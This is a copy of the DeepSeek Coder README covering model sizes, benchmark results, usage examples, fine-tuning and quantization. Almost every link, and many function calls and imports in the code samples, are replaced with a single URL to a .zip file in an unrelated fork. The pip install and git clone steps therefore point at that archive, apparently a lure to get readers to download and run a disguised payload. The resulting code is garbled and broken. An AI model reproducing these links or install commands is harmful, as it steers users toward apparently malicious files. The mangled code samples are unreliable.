<p align="center">
<img width="1000px" alt="DeepSeek Coder" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">
</p>
<p align="center"><a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">[<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" width="20px"> Homepage]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">[🤖 Chat with DeepSeek Coder]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">[🤗 Models Download]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">[Discord]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip">[WeChat (微信)]</a></p>
<p align="center">
  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip"><b>Paper Link</b>👁️</a>
</p>
<hr>


### 1. Introduction of DeepSeek Coder

DeepSeek Coder is composed of a series of code language models, each trained from scratch on 2T tokens, with a composition of 87% code and 13% natural language in both English and Chinese. We provide various sizes of the code model, ranging from 1B to 33B versions. Each model is pre-trained on project-level code corpus by employing a window size of 16K and an extra fill-in-the-blank task, to support project-level code completion and infilling. For coding capabilities, DeepSeek Coder achieves state-of-the-art performance among open-source code models on multiple programming languages and various benchmarks.

<p align="center">
<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" alt="result" width="70%">
</p>

- **Massive Training Data**: Trained from scratch on 2T tokens, including 87% code and 13% linguistic data in both English and Chinese languages.

- **Highly Flexible & Scalable**: Offered in model sizes of 1B, 5.7B, 6.7B and 33B, enabling users to choose the setup most suitable for their requirements.

- **Superior Model Performance**: State-of-the-art performance among publicly available code models on HumanEval, MultiPL-E, MBPP, DS-1000, and APPS benchmarks.

- **Advanced Code Completion Capabilities**: A window size of 16K and a fill-in-the-blank task, supporting project-level code completion and infilling tasks.

#### Supported Programming Languages
`['ada', 'agda', 'alloy', 'antlr', 'applescript', 'assembly', 'augeas', 'awk', 'batchfile', 'bluespec', 'c', 'c-sharp', 'clojure', 'cmake', 'coffeescript', 'common-lisp', 'cpp', 'css', 'cuda', 'dart', 'dockerfile', 'elixir', 'elm', 'emacs-lisp', 'erlang', 'f-sharp', 'fortran', 'glsl', 'go', 'groovy', 'haskell', 'html', 'idris', 'isabelle', 'java', 'java-server-pages', 'javascript', 'json', 'julia', 'jupyter-notebook', 'kotlin', 'lean', 'literate-agda', 'literate-coffeescript', 'literate-haskell', 'lua', 'makefile', 'maple', 'markdown', 'mathematica', 'matlab', 'ocaml', 'pascal', 'perl', 'php', 'powershell', 'prolog', 'protocol-buffer', 'python', 'r', 'racket', 'restructuredtext', 'rmarkdown', 'ruby', 'rust', 'sas', 'scala', 'scheme', 'shell', 'smalltalk', 'solidity', 'sparql', 'sql', 'stan', 'standard-ml', 'stata', 'systemverilog', 'tcl', 'tcsh', 'tex', 'thrift', 'typescript', 'verilog', 'vhdl', 'visual-basic', 'xslt', 'yacc', 'yaml', 'zig']`

### 2. Evaluation Results
We evaluate DeepSeek Coder on various coding-related benchmarks.
Only `pass@1` results on HumanEval (Python and Multilingual), MBPP, and DS-1000 are reported here:

<p align="center">
<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" alt="table" width="70%">
</p>


The result shows that DeepSeek-Coder-Base-33B significantly outperforms existing open-source code LLMs. Compared with CodeLlama-34B, it leads by 7.9%, 9.3%, 10.8% and 5.9% respectively on HumanEval Python, HumanEval Multilingual, MBPP and DS-1000.
Surprisingly, our DeepSeek-Coder-Base-7B reaches the performance of CodeLlama-34B.
The DeepSeek-Coder-Instruct-33B model after instruction tuning outperforms GPT35-turbo on HumanEval and achieves comparable results with GPT35-turbo on MBPP.

More evaluation details can be found in the [Detailed Evaluation](#6-detailed-evaluation-results).


### 3. Procedure of Data Creation and Model Training

#### Data Creation

- Step 1: Collect code data from GitHub and apply the same filtering rules as [StarCoder Data](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) to filter data.
- Step 2: Parsing the dependencies of files within the same repository to rearrange the file positions based on their dependencies.
- Step 3: Concatenating dependent files to form a single example and employ repo-level minhash for deduplication.
- Step 4: Further filtering out low-quality code, such as codes with syntax errors or poor readability.

<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" alt="data_creation" width="100%">

#### Model Training

- Step 1: Initially pre-trained with a dataset consisting of 87% code, 10% code-related language (Github Markdown and StackExchange), and 3% non-code-related Chinese language. Models are pre-trained using 1.8T tokens and a 4K window size in this step.
- Step 2: Further Pre-training using an extended 16K window size on an additional 200B tokens, resulting in foundational models (**DeepSeek-Coder-Base**).
- Step 3: Instruction Fine-tuning on 2B tokens of instruction data, resulting in instruction-tuned models (**DeepSeek-Coder-Instruct**).

<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" alt="model_pretraining" width="100%">


### 4. How to Use
Before proceeding, you'll need to install the necessary dependencies. You can do this by running the following command:
```
pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
```
A demo is also available on the [🤗 Hugging Face Space](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip), and you can run the demo locally using `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip` in the [demo](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) folder.  (Thanks to all the HF team for their support)

Here are some examples of how to use our model.

#### 1) Code Completion
```python
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).cuda()
input_text = "#write a quick sort algorithm"
inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(**inputs, max_length=128)
print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(outputs[0], skip_special_tokens=True))
```
This code will output the following result:
```
def quick_sort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[0]
    left = []
    right = []
    for i in range(1, len(arr)):
        if arr[i] < pivot:
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(arr[i])
        else:
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(arr[i])
    return quick_sort(left) + [pivot] + quick_sort(right)
```

#### 2) Code Insertion
```python
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).cuda()
input_text = """<｜fim▁begin｜>def quick_sort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[0]
    left = []
    right = []
<｜fim▁hole｜>
        if arr[i] < pivot:
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(arr[i])
        else:
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(arr[i])
    return quick_sort(left) + [pivot] + quick_sort(right)<｜fim▁end｜>"""
inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(**inputs, max_length=128)
print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(outputs[0], skip_special_tokens=True)[len(input_text):])
```
This code will output the following result:
```
   for i in range(1, len(arr)):
```

#### 3) Chat Model Inference
```python
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True)
model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).cuda()
messages=[
    { 'role': 'user', 'content': "write a quick sort algorithm in python."}
]
inputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(messages, add_generation_prompt=True, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip is the id of <|EOT|> token
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(inputs, max_new_tokens=512, do_sample=False, top_k=50, top_p=0.95, num_return_sequences=1, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(outputs[0][len(inputs[0]):], skip_special_tokens=True))
```
This code will output the following result:
```
Sure, here is a simple implementation of the Quick Sort algorithm in Python:

def quick_sort(arr):
    if len(arr) <= 1:
        return arr
    else:
        pivot = arr[0]
        less_than_pivot = [x for x in arr[1:] if x <= pivot]
        greater_than_pivot = [x for x in arr[1:] if x > pivot]
        return quick_sort(less_than_pivot) + [pivot] + quick_sort(greater_than_pivot)

# Test the function
arr = [10, 7, 8, 9, 1, 5]
print("Original array:", arr)
print("Sorted array:", quick_sort(arr))

This code works by selecting a 'pivot' element from the array and partitioning the other elements into two sub-arrays, according to whether they are less than or greater than the pivot. The pivot element is then in its final position. The process is then repeated for the sub-arrays.
```

If you don't want to use the provided API `apply_chat_template` which loads the template from `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip`, you can use the following template to chat with our model. Replace the `['content']` with your instructions and the model's previous (if any) responses, then the model will generate the response to the currently given instruction.
```
You are an AI programming assistant, utilizing the DeepSeek Coder model, developed by DeepSeek Company, and you only answer questions related to computer science. For politically sensitive questions, security and privacy issues, and other non-computer science questions, you will refuse to answer.
### Instruction:
['content']
### Response:
['content']
<|EOT|>
### Instruction:
['content']
### Response:

```

#### 4) Repository Level Code Completion
```python
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).cuda()

input_text = """https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
import torch
from sklearn import datasets
from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip import train_test_split
from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip import StandardScaler
from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip import accuracy_score

def load_data():
    iris = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()
    X = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
    y = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip

    # Standardize the data
    scaler = StandardScaler()
    X = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(X)

    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)

    # Convert numpy data to PyTorch tensors
    X_train = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(X_train, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
    X_test = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(X_test, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
    y_train = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(y_train, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
    y_test = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(y_test, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

    return X_train, X_test, y_train, y_test

def evaluate_predictions(y_test, y_pred):
    return accuracy_score(y_test, y_pred)


# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
import torch
import https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip as nn
import https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip as optim
from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip import DataLoader, TensorDataset

class IrisClassifier(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip):
    def __init__(self):
        super(IrisClassifier, self).__init__()
        https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(4, 16),
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(),
            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(16, 3)
        )

    def forward(self, x):
        return https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(x)

    def train_model(self, X_train, y_train, epochs, lr, batch_size):
        criterion = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()
        optimizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(), lr=lr)

        # Create DataLoader for batches
        dataset = TensorDataset(X_train, y_train)
        dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True)

        for epoch in range(epochs):
            for batch_X, batch_y in dataloader:
                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()
                outputs = self(batch_X)
                loss = criterion(outputs, batch_y)
                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()
                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()

    def predict(self, X_test):
        with https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip():
            outputs = self(X_test)
            _, predicted = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(1)
        return https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip()


# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
from utils import load_data, evaluate_predictions
from model import IrisClassifier as Classifier

def main():
    # Model training and evaluation
"""
inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(**inputs, max_new_tokens=140)
print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(outputs[0]))
```

---
In the following scenario, the DeepSeek-Coder-6.7B model effectively calls a class **IrisClassifier** and its member function from the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip` file, and also utilizes functions from the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip` file, to correctly complete the **main** function in the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip` file for model training and evaluation.

![Completion GIF](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

### 5. How to Fine-tune DeepSeek-Coder

We provide script `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip` for users to finetune our models on downstream tasks.

The script supports the training with [DeepSpeed](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip). You need install required packages by:

```bash
pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
```

Please follow [Sample Dataset Format](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) to prepare your training data.
Each line is a json-serialized string with two required fields `instruction` and `output`.

After data preparation, you can use the sample shell script to finetune `deepseek-ai/deepseek-coder-6.7b-instruct`. 
Remember to specify `DATA_PATH`, `OUTPUT_PATH`.
And please choose appropriate hyper-parameters(e.g., `learning_rate`, `per_device_train_batch_size`) according to your scenario.

```bash
DATA_PATH="<your_data_path>"
OUTPUT_PATH="<your_output_path>"
MODEL="deepseek-ai/deepseek-coder-6.7b-instruct"

cd finetune && deepspeed https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip \
    --model_name_or_path $MODEL_PATH \
    --data_path $DATA_PATH \
    --output_dir $OUTPUT_PATH \
    --num_train_epochs 3 \
    --model_max_length 1024 \
    --per_device_train_batch_size 16 \
    --per_device_eval_batch_size 1 \
    --gradient_accumulation_steps 4 \
    --evaluation_strategy "no" \
    --save_strategy "steps" \
    --save_steps 100 \
    --save_total_limit 100 \
    --learning_rate 2e-5 \
    --warmup_steps 10 \
    --logging_steps 1 \
    --lr_scheduler_type "cosine" \
    --gradient_checkpointing True \
    --report_to "tensorboard" \
    --deepspeed https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip \
    --bf16 True
```

### 6. Detailed Evaluation Results

The reproducible code for the following evaluation results can be found in the [Evaluation](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) directory.
#### 1) Multilingual HumanEval Benchmark
![HumanEval](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

#### 2) MBPP Benchmark
<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip" alt="MBPP" width="40%">

#### 3) DS-1000 Benchmark
![DS-1000](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

#### 4) Program-Aid Math Reasoning Benchmark
![Math](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

### Inference with vLLM

You can also employ [vLLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) for high-throughput inference.

**Text Completion**

```python
from vllm import LLM, SamplingParams

tp_size = 4 # Tensor Parallelism
sampling_params = SamplingParams(temperature=0.7, top_p=0.9, max_tokens=100)
model_name = "deepseek-ai/deepseek-coder-6.7b-base"
llm = LLM(model=model_name, trust_remote_code=True, gpu_memory_utilization=0.9, tensor_parallel_size=tp_size)

prompts = [
    "If everyone in a country loves one another,",
    "The research should also focus on the technologies",
    "To determine if the label is correct, we need to"
]
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(prompts, sampling_params)

generated_text = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip[0].text for output in outputs]
print(generated_text)
```

**Chat Completion**

```python
from transformers import AutoTokenizer
from vllm import LLM, SamplingParams

tp_size = 4 # Tensor Parallelism
sampling_params = SamplingParams(temperature=0.7, top_p=0.9, max_tokens=100)
model_name = "deepseek-ai/deepseek-coder-6.7b-instruct"
tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(model_name)
llm = LLM(model=model_name, trust_remote_code=True, gpu_memory_utilization=0.9, tensor_parallel_size=tp_size)

messages_list = [
    [{"role": "user", "content": "Who are you?"}],
    [{"role": "user", "content": "What can you do?"}],
    [{"role": "user", "content": "Explain Transformer briefly."}],
]
prompts = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(messages, add_generation_prompt=True, tokenize=False) for messages in messages_list]

https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip]
outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip(prompts, sampling_params)

generated_text = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip[0].text for output in outputs]
print(generated_text)
```

### 7. Q&A

#### Could You Provide the https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip File for Model Quantization?

DeepSeek Coder utilizes the [HuggingFace Tokenizer](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) to implement the Bytelevel-BPE algorithm, with specially designed pre-tokenizers to ensure optimal performance. Currently, there is no direct way to convert the tokenizer into a SentencePiece tokenizer. We are contributing to the open-source quantization methods facilitate the usage of HuggingFace Tokenizer.

##### GGUF(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip)

We have submitted a [PR](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) to the popular quantization repository [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) to fully support all HuggingFace pre-tokenizers, including ours.

While waiting for the PR to be merged, you can generate your GGUF model using the following steps:

```bash
git clone https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
cd https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
git checkout regex_gpt2_preprocess
# set up the environment according to README
make
python3 -m pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip
# generate GGUF model
python https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip <MODEL_PATH> --outfile <GGUF_PATH> --model-name deepseekcoder
# use q4_0 quantization as an example
./quantize <GGUF_PATH> <OUTPUT_PATH> q4_0
./main -m <OUTPUT_PATH> -n 128 -p <PROMPT>
```
##### GPTQ(exllamav2)

`UPDATE:`[exllamav2](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) has been able to support Huggingface Tokenizer. Please pull the latest version and try out.

Remember to set RoPE scaling to 4 for correct output, more discussion could be found in this [PR](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).

#### How to use the deepseek-coder-instruct to complete the code?

